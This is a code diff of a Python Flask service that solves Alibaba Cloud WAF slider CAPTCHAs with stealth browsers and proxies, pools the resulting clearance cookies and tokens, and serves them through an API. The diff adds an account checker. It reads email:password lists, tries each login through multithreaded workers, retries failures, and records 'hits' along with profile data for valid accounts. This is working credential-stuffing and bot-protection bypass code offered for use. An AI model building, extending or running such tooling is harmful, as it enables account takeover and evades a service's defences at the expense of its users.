-        if slider_appeared:
-            ok, reason = await _solve_waf_in_page(page, ctx)
-        else:
-            # No slider — check if we already have an acw cookie; if not,
-            # this session is useless for the caller.
-            try:
-                names_lower = {k.lower() for k in (await _collect_cookies(ctx)).keys()}
-            except Exception:
-                names_lower = set()
-            if 'acw_tc' not in names_lower:
-                _spawn_rearm(ctx, page, uses)
-                return False, "probe_no_slider_no_cookie", sid, {}
+        if not slider_appeared and not ok:
+            _spawn_rearm(ctx, page, wid, uses)
+            return False, "probe_no_slider_no_cookie", sid, {}
 
         cookies = await _collect_cookies(ctx)
+        if ok:
+            for _ in range(20):
+                names_lower = {k.lower() for k in cookies.keys()}
+                if "acw_tc" in names_lower or "acw_sc__v2" in names_lower:
+                    break
+                await asyncio.sleep(0.1)
+                cookies = await _collect_cookies(ctx)
 
-        # Register the resulting cffi session for /api/check
         if ok:
             try:
                 sess, proxy = _make_cffi_session(dev, cookies)
@@ -761,13 +1016,13 @@ async def _waf_probe_only():
             except Exception:
                 pass
 
-        _spawn_rearm(ctx, page, uses)
+        _spawn_rearm(ctx, page, wid, uses)
         if not ok:
             return False, f"probe_{reason}", sid, cookies
         return True, None, sid, cookies
     except Exception as e:
         try:
-            _spawn_rearm(ctx, page, uses)
+            _spawn_rearm(ctx, page, wid, uses)
         except Exception:
             pass
         return None, f"probe_error:{type(e).__name__}:{str(e)[:120]}", None, {}
@@ -776,44 +1031,21 @@ def _probe_sync():
     loop = _ensure_waf_loop()
     fut = asyncio.run_coroutine_threadsafe(_waf_probe_only(), loop)
     try:
-        return fut.result(timeout=SOLVE_TIMEOUT_S)
+        return fut.result(timeout=SOLVE_TIMEOUT_S + 15)
     except Exception as e:
         return None, f"timeout_or_error:{e}", None, {}
 
-def _classify_result(txt):
-    if not txt:
-        return ('retry', {'message': 'empty'})
-    if txt.startswith('FETCH_ERR'):
-        return ('retry', {'message': txt[:80]})
-    if not txt.strip().startswith('{'):
-        if 'AliyunCaptcha' in txt or 'sceneId' in txt:
-            return ('retry', {'message': 'slider_html'})
-        return ('retry', {'message': f'html_{len(txt)}b'})
-    try:
-        d = json.loads(txt)
-    except Exception:
-        return ('retry', {'message': 'json_parse_fail'})
-    code = d.get('code', -999)
-    if code == 0:
-        return ('valid', d.get('data', {}))
-    if code in (1005, 3301, 3302, 1086, 1087):
-        return ('invalid', d)
-    if code in (1013, -2):
-        return ('retry', d)
-    return ('error', d)
-
-def _solve_and_login_sync(email, password):
+def _solve_and_login_sync(email, password, label=None, wid=0):
     loop = _ensure_waf_loop()
-    fut = asyncio.run_coroutine_threadsafe(_solve_and_login(email, password), loop)
+    fut = asyncio.run_coroutine_threadsafe(
+        _solve_and_login(email, password, label=label, wid=wid), loop)
     try:
-        return fut.result(timeout=SOLVE_TIMEOUT_S + 30)
+        return fut.result(timeout=SOLVE_TIMEOUT_S + 60)
     except Exception as e:
         return None, {}, f"timeout_or_error:{e}", None
 
 # ─────────────────────────────────────────────────────────────
-#  LEGACY PREFETCH — warm-pool backed, now REGISTERS too
-#  [FIX] Tracks slider_solved properly; refuses to return cookies
-#        without real WAF clearance — eliminates `html_2786b`.
+#  LEGACY PREFETCH (same inline pattern)
 # ─────────────────────────────────────────────────────────────
 _PREFETCH_QUEUE   = queue.Queue(maxsize=64)
 _PREFETCH_TARGET  = int(os.getenv("WAF_PREFETCH_TARGET", "16"))
@@ -827,77 +1059,62 @@ async def _async_fetch_waf_via_browser():
     try:
         await _get_waf_browser()
         await _init_warm_pool()
-        ctx, page, uses = await _acquire_warm()
+        ctx, page, wid, uses = await _acquire_warm()
     except Exception as e:
         return None, {}, f"pool_acquire:{type(e).__name__}:{str(e)[:120]}", sid
 
+    fetch_js = _abortable_fetch_js(_dummy_payload(),
+                                    var_name="__wafProbe",
+                                    abort_var="__wafProbeAbort",
+                                    timeout_ms=15000)
     try:
         try:
-            await page.evaluate(f"""() => {{
-                fetch('{API_URL}', {{
-                    method: 'POST', credentials: 'include',
-                    headers: {json.dumps(FETCH_HEADERS)},
-                    body: {json.dumps(_dummy_payload())}
-                }}).catch(() => {{}})
-            }}""")
+            await page.evaluate(fetch_js)
         except Exception:
             pass
 
-        # [FIX] Retry the dummy fetch if the slider doesn't show.
-        slider_appeared = False
-        for attempt in range(3):
+        txt = ""
+        drag_attempt = 0
+        max_polls = int(SOLVE_TIMEOUT_S / 0.08) + 20
+
+        for _ in range(max_polls):
             try:
-                await page.wait_for_selector(
-                    "#aliyunCaptcha-sliding-slider", timeout=2500)
-                slider_appeared = True
+                combined = await page.evaluate("""async()=>{
+                    const slider = !!document.getElementById('aliyunCaptcha-sliding-slider');
+                    if (slider) return {slider:true, res:'__PENDING__'};
+                    if (!window.__wafProbe) return {slider:false, res:'__PENDING__'};
+                    const t = new Promise(r=>setTimeout(()=>r('__PENDING__'), 50));
+                    const res = await Promise.race([window.__wafProbe, t]);
+                    return {slider:false, res};
+                }""")
+            except Exception:
+                combined = {"slider": False, "res": "__PENDING__"}
+
+            if combined.get("res") and combined["res"] != "__PENDING__":
+                txt = combined["res"]
                 break
-            except Exception:
-                if attempt < 2:
-                    try:
-                        await page.evaluate(f"""() => {{
-                            fetch('{API_URL}', {{
-                                method: 'POST', credentials: 'include',
-                                headers: {json.dumps(FETCH_HEADERS)},
-                                body: {json.dumps(_dummy_payload())}
-                            }}).catch(() => {{}})
-                        }}""")
-                    except Exception:
-                        pass
-                    await asyncio.sleep(0.3)
-
-        # [FIX] Track slider_solved explicitly. The previous code
-        # discarded the `ok` return of `_solve_waf_in_page` and returned
-        # HTML even when the solve failed — causing `html_2786b` on the
-        # tester side.
-        slider_solved = False
-        if slider_appeared:
-            for _attempt in range(3):
-                ok, _reason = await _solve_waf_in_page(page, ctx)
-                if ok:
-                    slider_solved = True
+            if combined.get("slider"):
+                drag_attempt += 1
+                if drag_attempt > MAX_DRAG_ATTEMPTS:
                     break
-                try:
-                    await page.reload(wait_until="domcontentloaded", timeout=15000)
-                    await asyncio.sleep(0.5)
-                except Exception:
-                    pass
-        else:
-            # No slider — count as solved only if an acw cookie already exists.
-            try:
-                names = {k.lower() for k in (await _collect_cookies(ctx)).keys()}
-                slider_solved = 'acw_tc' in names
-            except Exception:
-                slider_solved = False
+                await _solve_waf_in_page(page, ctx, wid)
+                await asyncio.sleep(0.25)
+                continue
+            await asyncio.sleep(0.08)
 
-        # [FIX] Refuse to return a session with no real WAF clearance.
-        if not slider_solved:
-            print(f"  \033[93m⚠ /api/waf: slider not solved — "
-                  f"returning empty\033[0m", flush=True)
-            _spawn_rearm(ctx, page, uses)
-            return None, {}, "no_waf_clearance", sid
+        try:
+            await page.evaluate(
+                "()=>{try{if(window.__wafProbeAbort)window.__wafProbeAbort.abort()}catch(e){};"
+                "delete window.__wafProbe; delete window.__wafProbeAbort;}")
+        except Exception:
+            pass
 
         cookies = await _collect_cookies(ctx)
-        html = await page.content()
+        for _ in range(20):
+            if any(k.startswith("acw") for k in cookies):
+                break
+            await asyncio.sleep(0.1)
+            cookies = await _collect_cookies(ctx)
 
         try:
             sess, proxy = _make_cffi_session(dev, cookies)
@@ -905,11 +1122,21 @@ async def _async_fetch_waf_via_browser():
         except Exception:
             pass
 
-        _spawn_rearm(ctx, page, uses)
+        _spawn_rearm(ctx, page, wid, uses)
+
+        if txt and txt.strip().startswith("{"):
+            return txt, cookies, None, sid
+        try:
+            html = await page.content()
+        except Exception:
+            html = ""
+        if not html:
+            return None, cookies, "no_waf_clearance", sid
         return html, cookies, None, sid
+
     except Exception as e:
         try:
-            _spawn_rearm(ctx, page, uses)
+            _spawn_rearm(ctx, page, wid, uses)
         except Exception:
             pass
         return None, {}, f"browser_error:{type(e).__name__}:{str(e)[:120]}", sid
@@ -918,7 +1145,7 @@ def _fetch_waf_via_browser_sync():
     loop = _ensure_waf_loop()
     fut = asyncio.run_coroutine_threadsafe(_async_fetch_waf_via_browser(), loop)
     try:
-        return fut.result(timeout=SOLVE_TIMEOUT_S + 30)
+        return fut.result(timeout=SOLVE_TIMEOUT_S + 60)
     except Exception as e:
         return None, {}, f"timeout_or_error:{e}", None
 
@@ -951,6 +1178,95 @@ def _ensure_prefetch_pool():
             t.start()
 
 # ─────────────────────────────────────────────────────────────
+#  ACCOUNT CHECKER
+# ─────────────────────────────────────────────────────────────
+def _check_account(email, password, nick=None, wid=0):
+    txt, cookies, err, sid = _solve_and_login_sync(
+        email, password, label=nick, wid=wid)
+    if err:
+        dbg(f"w{wid} {nick or email} → retry: {err}")
+        return None
+
+    kind, payload = _classify_result(txt or "")
+    if kind == "valid":
+        with waf_sessions_lock:
+            info = waf_sessions.get(sid)
+        profile = {}
+        if info and (payload.get('u_asig') or payload.get('u_atoken')):
+            try:
+                profile = asyncio.run_coroutine_threadsafe(
+                    _fetch_profile(info["sess"], info["ua"], info["dev"], cookies),
+                    _ensure_waf_loop(),
+                ).result(timeout=15)
+            except Exception:
+                profile = {}
+        print(_format_hit(nick or email, profile, payload), flush=True)
+        return (email, payload, profile)
+
+    if kind == "invalid":
+        dbg(f"w{wid} {nick or email} → invalid credentials")
+        return None
+
+    dbg(f"w{wid} {nick or email} → retry: {kind} {payload}")
+    return None
+
+def run_account_checker(path, workers=4, retries=3):
+    accs = []
+    with open(path, encoding="utf-8") as f:
+        for line in f:
+            line = line.strip()
+            if not line or line.startswith("#"):
+                continue
+            parts = line.split(":")
+            if len(parts) >= 2:
+                accs.append((parts[0], parts[1],
+                             parts[2] if len(parts) > 2 else parts[0]))
+
+    if not accs:
+        print(f"  \033[91m✗ No accounts in {path}\033[0m", flush=True)
+        return [], []
+
+    q = queue.Queue()
+    for a in accs:
+        q.put(a)
+
+    hits, misses = [], []
+    hits_lock = threading.Lock()
+
+    def worker(wid):
+        while True:
+            try:
+                email, pw, nick = q.get_nowait()
+            except queue.Empty:
+                return
+            got = None
+            for attempt in range(1, retries + 1):
+                dbg(f"w{wid} {nick} try {attempt}/{retries}")
+                got = _check_account(email, pw, nick=nick, wid=wid)
+                if got:
+                    break
+                if attempt < retries:
+                    dbg(f"w{wid} {nick} reloading page...")
+                    time.sleep(0.4)
+            with hits_lock:
+                (hits if got else misses).append(nick)
+
+    threads = [
+        threading.Thread(target=worker, args=(i,), daemon=True, name=f"w{i}")
+        for i in range(workers)
+    ]
+    for t in threads:
+        t.start()
+    for t in threads:
+        t.join()
+
+    print(f"\n  ✓ {len(hits)} hits, ✗ {len(misses)} misses", flush=True)
+    if misses:
+        print(f"  Misses: {', '.join(misses[:40])}"
+              f"{'...' if len(misses) > 40 else ''}", flush=True)
+    return hits, misses
+
+# ─────────────────────────────────────────────────────────────
 #  API ROUTES
 # ─────────────────────────────────────────────────────────────
 
@@ -967,7 +1283,6 @@ def api_solve():
 
     t0 = time.time()
 
-    # ── FAST PROBE PATH (no credentials) ──────────────────────
     if probe_only:
         ok, err, sid, cookies = _probe_sync()
         dt_ms = int((time.time() - t0) * 1000)
@@ -977,40 +1292,23 @@ def api_solve():
 
         if not ok:
             return jsonify({
-                'ok': True,
-                'result': 'waf_blocked',
-                'data': {},
-                'cookies': cookies or {},
-                'sid': sid,
-                'timing_ms': dt_ms,
-                'raw_len': 0,
+                'ok': True, 'result': 'waf_blocked', 'data': {},
+                'cookies': cookies or {}, 'sid': sid,
+                'timing_ms': dt_ms, 'raw_len': 0,
             })
 
-        # Register a reusable session entry so /api/status sees it.
         asig = f"waf_{sid}_{int(time.time() * 1000)}"
-        _register_pool_entry(
-            atoken=sid,
-            asig=asig,
-            cookies=cookies or {},
-            dev=None,
-            sid=sid,
-            synthetic=True,
-        )
+        _register_pool_entry(atoken=sid, asig=asig, cookies=cookies or {},
+                             dev=None, sid=sid, synthetic=True)
 
         return jsonify({
-            'ok': True,
-            'result': 'waf_clear',
-            'data': {},
-            'cookies': cookies or {},
-            'sid': sid,
-            'u_asig': asig,
-            'u_atoken': sid,
-            'timing_ms': dt_ms,
-            'raw_len': 0,
+            'ok': True, 'result': 'waf_clear', 'data': {},
+            'cookies': cookies or {}, 'sid': sid,
+            'u_asig': asig, 'u_atoken': sid,
+            'timing_ms': dt_ms, 'raw_len': 0,
         })
 
-    # ── FULL LOGIN PATH (credentials provided) ────────────────
-    txt, cookies, err, sid = _solve_and_login_sync(email, password)
+    txt, cookies, err, sid = _solve_and_login_sync(email, password, label=email)
     dt_ms = int((time.time() - t0) * 1000)
 
     if err:
@@ -1020,9 +1318,9 @@ def api_solve():
         }), 502
 
     kind, payload = _classify_result(txt or '')
-
-    # If the login succeeded and returned a real u_asig, register it.
     if kind == 'valid' and isinstance(payload, dict):
+        # Only register pool entries for token-based responses (legacy shape).
+        # Session-based responses (guid+session) don't have tokens to pool.
         atoken = payload.get('u_atoken') or ''
         asig   = payload.get('u_asig')   or ''
         if asig:
@@ -1030,13 +1328,9 @@ def api_solve():
                                  cookies=cookies or {}, sid=sid)
 
     return jsonify({
-        'ok': True,
-        'result': kind,
-        'data': payload,
-        'cookies': cookies,
-        'sid': sid,
-        'timing_ms': dt_ms,
-        'raw_len': len(txt or ''),
+        'ok': True, 'result': kind, 'data': payload,
+        'cookies': cookies, 'sid': sid,
+        'timing_ms': dt_ms, 'raw_len': len(txt or ''),
     })
 
 
@@ -1067,7 +1361,6 @@ def api_waf():
         return jsonify({'ok': False, 'error': 'fetch_failed',
                         'detail': error_msg or 'unknown'}), 502
 
-    # Register so status/consumers can see it.
     if sid:
         asig = f"waf_{sid}_{int(time.time() * 1000)}"
         _register_pool_entry(atoken=sid, asig=asig,
@@ -1115,8 +1408,7 @@ def api_recv_token():
             atoken=d.get('u_atoken') or '',
             asig=sig,
             cookies=d.get('cookies') or {},
-            dev=dev_info,
-            sid=sid,
+            dev=dev_info, sid=sid,
         )
         if not added:
             _log(f"⚠ Duplicate token skipped: {sig[:20]}...", False)
@@ -1154,7 +1446,7 @@ def api_consume():
         'cv':          t.get('cv', ''),
         'brand':       t.get('brand', ''),
         'ver':         t.get('ver', ''),
-        'sid':         sig_to_sid.get(t.get('u_asig', ''), None),
+        'sid':         t.get('sid') or sig_to_sid.get(t.get('u_asig', ''), None),
         'synthetic':   t.get('synthetic', False),
     })
 
@@ -1175,13 +1467,10 @@ def api_consume_url():
     asig   = t.get('u_asig', '')
     url    = f"{LOGIN_URL}/?u_atoken={atoken}&u_asig={asig}"
     return jsonify({
-        'ok': True,
-        'url': url,
-        'u_atoken': atoken,
-        'u_asig': asig,
-        'cookies': t.get('cookies', {}),
-        'ts': t.get('ts', 0),
-        'sid': sig_to_sid.get(asig, None),
+        'ok': True, 'url': url,
+        'u_atoken': atoken, 'u_asig': asig,
+        'cookies': t.get('cookies', {}), 'ts': t.get('ts', 0),
+        'sid': t.get('sid') or sig_to_sid.get(asig, None),
         'synthetic': t.get('synthetic', False),
         'expires_in': max(0, int(TOKEN_EXPIRY - (now - t.get('_added', now)))),
     })
@@ -1293,16 +1582,12 @@ def api_status():
         active = sum(1 for t in token_pool if (now - t.get('_added', now)) <= TOKEN_EXPIRY)
     warm_avail = _warm_queue.qsize() if _warm_queue is not None else 0
     return jsonify({
-        'pool':  active,
-        'solved': total_ok,
-        'total_solved': total_ok,
-        'failed': total_fail,
-        'used': len(used_sigs),
+        'pool':  active, 'solved': total_ok, 'total_solved': total_ok,
+        'failed': total_fail, 'used': len(used_sigs),
         'rate':  round(total_ok / (el / 60), 1),
         'uptime': int(el),
         'session_reset_s': SESSION_RESET_S,
-        'warm_pages': warm_avail,
-        'warm_size': WARM_SIZE,
+        'warm_pages': warm_avail, 'warm_size': WARM_SIZE,
     })
 
 
@@ -1327,8 +1612,7 @@ def api_monitor():
         total_consumed = 0
         for ip, info in consumer_stats.items():
             consumers.append({
-                'ip': ip,
-                'count': info['count'],
+                'ip': ip, 'count': info['count'],
                 'last': int(now - info['last']) if info['last'] else 0,
             })
             total_consumed += info['count']
@@ -1338,12 +1622,10 @@ def api_monitor():
     return jsonify({
         'solved': total_ok, 'failed': total_fail, 'pool': active_pool,
         'rate': round(total_ok / (el / 60), 1), 'uptime': int(el),
-        'success_rate': success_rate,
-        'used': len(used_sigs),
+        'success_rate': success_rate, 'used': len(used_sigs),
         'total_consumed': total_consumed,
         'unique_consumers': len(consumers),
-        'consumers': consumers[:20],
-        'pool_ages': pool_ages[:10],
+        'consumers': consumers[:20], 'pool_ages': pool_ages[:10],
         'token_expiry': TOKEN_EXPIRY,
         'session_reset_s': SESSION_RESET_S,
         'warm_pages': warm_avail, 'warm_size': WARM_SIZE,
@@ -1375,8 +1657,7 @@ def api_proxy():
         except Exception as e:
             return jsonify({'ok': False, 'error': f'session_init: {e}'}), 500
     req_headers = {
-        'User-Agent': ua,
-        'Accept': '*/*',
+        'User-Agent': ua, 'Accept': '*/*',
         'Origin': 'https://g.alicdn.com',
         'Referer': 'https://g.alicdn.com/',
     }
@@ -1562,7 +1843,7 @@ body{background:#0a0a0a;color:#eee;font:12px monospace;overflow:hidden;height:10
       const r = await fetch('/api/solve', {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({}),   // probe path — server now registers the session
+        body: JSON.stringify({}),
       });
       if(!r.ok){
         let detail = '';
@@ -1722,7 +2003,7 @@ setInterval(poll,1500);poll();
 
 
 # ═══════════════════════════════════════════════════════════
-#  SOLVER SLOTS — kontolsolver.WAFSolver
+#  SOLVER SLOTS
 # ═══════════════════════════════════════════════════════════
 _solver_slots_started = False
 _solver_slots_lock = threading.Lock()
@@ -1798,13 +2079,8 @@ def _push_solved_token(tok, asig, cookies=None):
                 k, _, v = pair.partition('=')
                 ck[k.strip()] = v.strip()
         cookies = ck
-    _register_pool_entry(
-        atoken=tok,
-        asig=asig,
-        cookies=cookies or {},
-        dev=None,
-        sid=None,
-    )
+    _register_pool_entry(atoken=tok, asig=asig, cookies=cookies or {},
+                         dev=None, sid=None)
 
 
 def _ask(prompt, default):
@@ -1892,24 +2168,20 @@ def _interactive_setup():
 if __name__ == '__main__':
     import argparse
     ap = argparse.ArgumentParser()
-
-    _default_port = int(os.environ.get('PORT', '5555'))
-    _default_host = os.environ.get('HOST', '127.0.0.1')
-    ap.add_argument('--port', type=int, default=_default_port)
-    ap.add_argument('--host', default=_default_host)
-    ap.add_argument('--proxies', default='proxies.txt',
-                    help='Path to proxy list (user:pass@host:port per line)')
-    ap.add_argument('--tokens', default=None,
-                    help='Path to save tokens file')
-    ap.add_argument('--launch', action='store_true',
-                    help='Run N in-process solver slots (kontolsolver engine)')
+    ap.add_argument('--port', type=int, default=5555)
+    ap.add_argument('--host', default='127.0.0.1')
+    ap.add_argument('--proxies', default='proxies.txt')
+    ap.add_argument('--tokens', default=None)
+    ap.add_argument('--launch', action='store_true')
     ap.add_argument('--slots', type=int, default=20)
     ap.add_argument('--transport', default='chromium', choices=['chromium', 'cloak'])
-    ap.add_argument('--headless', action='store_true',
-                    help='Headless solver browsers (default visible)')
+    ap.add_argument('--headless', action='store_true')
     ap.add_argument('--session-ttl', type=int, default=None)
-    ap.add_argument('--warm-pages', type=int, default=None,
-                    help=f'Warm-page pool size (default {WARM_SIZE})')
+    ap.add_argument('--warm-pages', type=int, default=None)
+    ap.add_argument('--solve-timeout', type=int, default=None)
+    ap.add_argument('--check-accounts', default=None)
+    ap.add_argument('--workers', type=int, default=4)
+    ap.add_argument('--retries', type=int, default=3)
     ap.add_argument('--interactive', '-i', action='store_true')
     if len(sys.argv) == 1 or '--interactive' in sys.argv or '-i' in sys.argv:
         args = _interactive_setup()
@@ -1920,25 +2192,27 @@ if __name__ == '__main__':
         SESSION_RESET_S = int(args.session_ttl)
         os.environ['WAF_SESSION_MAX_AGE'] = str(SESSION_RESET_S)
         print(f"  \033[96m→ Session TTL override: {SESSION_RESET_S}s\033[0m", flush=True)
-
     if getattr(args, 'warm_pages', None):
         WARM_SIZE = max(1, int(args.warm_pages))
         os.environ['WAF_WARM_PAGES'] = str(WARM_SIZE)
         print(f"  \033[96m→ Warm pool size: {WARM_SIZE}\033[0m", flush=True)
-
-    if args.slots > 20:
+    if getattr(args, 'solve_timeout', None):
+        SOLVE_TIMEOUT_S = max(5, int(args.solve_timeout))
+        os.environ['WAF_SOLVE_TIMEOUT'] = str(SOLVE_TIMEOUT_S)
+        print(f"  \033[96m→ Solve timeout: {SOLVE_TIMEOUT_S}s\033[0m", flush=True)
+    if getattr(args, 'slots', 0) > 20:
         args.slots = 20
         print(f"  \033[93m⚠ Slots capped at 20 max\033[0m", flush=True)
 
     script_dir = os.path.dirname(os.path.abspath(__file__))
-    if args.tokens:
+    if getattr(args, 'tokens', None):
         TOKEN_FILE = os.path.abspath(args.tokens)
     else:
         TOKEN_FILE = os.path.join(script_dir, 'tokens.txt')
 
     print(f"\n  \033[96mWAF SOLVER — Warm-page browser-backed\033[0m")
-    print(f"  \033[96mSession cycle: {SESSION_RESET_S}s auto-restart | Warm pool: {WARM_SIZE}\033[0m")
-    proxy_path = args.proxies
+    print(f"  \033[96mSession cycle: {SESSION_RESET_S}s auto-restart | Warm pool: {WARM_SIZE} | Solve timeout: {SOLVE_TIMEOUT_S}s\033[0m")
+    proxy_path = getattr(args, 'proxies', 'proxies.txt')
     if not os.path.isabs(proxy_path):
         proxy_path = os.path.join(script_dir, proxy_path)
     if os.path.exists(proxy_path):
@@ -1950,6 +2224,21 @@ if __name__ == '__main__':
         print(f"  \033[91m✗ cloakbrowser not installed — /api/solve will return 503.\033[0m")
         print(f"  \033[91m  pip install cloakbrowser\033[0m")
 
+    if getattr(args, 'check_accounts', None):
+        path = args.check_accounts
+        if not os.path.isabs(path):
+            path = os.path.join(script_dir, path)
+        if not os.path.exists(path):
+            print(f"  \033[91m✗ Accounts file not found: {path}\033[0m", flush=True)
+            sys.exit(1)
+        if not _HAS_BROWSER:
+            print(f"  \033[91m✗ cloakbrowser required for account checking\033[0m", flush=True)
+            sys.exit(1)
+        print(f"  \033[96m→ Account checker: {path} "
+              f"(workers={args.workers}, retries={args.retries})\033[0m\n", flush=True)
+        run_account_checker(path, workers=args.workers, retries=args.retries)
+        sys.exit(0)
+
     print(f"  Single:  http://localhost:{args.port}/")
     print(f"  Multi:   http://localhost:{args.port}/multi?n=4")
     print(f"  Monitor: http://localhost:{args.port}/monitor?key={MONITOR_KEY}")
@@ -1957,9 +2246,9 @@ if __name__ == '__main__':
     print(f"  Proxies: {len(PROXIES)} loaded")
     print(f"  API:     POST /api/solve | GET /api/tokens | GET /api/status\n")
 
-    if not args.launch:
+    if not getattr(args, 'launch', False):
         _ensure_prefetch_pool()
-    if args.launch:
+    if getattr(args, 'launch', False):
         try:
             cores = os.cpu_count() or 4
         except Exception:
